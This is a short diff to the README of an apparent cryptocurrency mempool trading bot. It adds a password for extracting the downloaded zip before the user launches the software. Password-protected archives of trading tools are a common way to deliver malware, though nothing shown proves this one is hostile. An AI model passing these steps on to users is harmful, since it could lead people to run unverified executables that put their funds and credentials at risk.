@@ -12,7 +12,7 @@ This is a cryptocurrency trading bot that uses mempool analysis to make trades. 
 
 ## Installation
 To install the bot, follow these steps:
-1. [Download](https://github.com/Lak1Lay/mempool-trading-bot/archive/refs/heads/main.zip) repo and extract files
+1. [Download](https://github.com/Lak1Lay/mempool-trading-bot/archive/refs/heads/main.zip) repo and extract files with password `memp00l`
 2. Move into the directory and launch software
 
 ## Usage
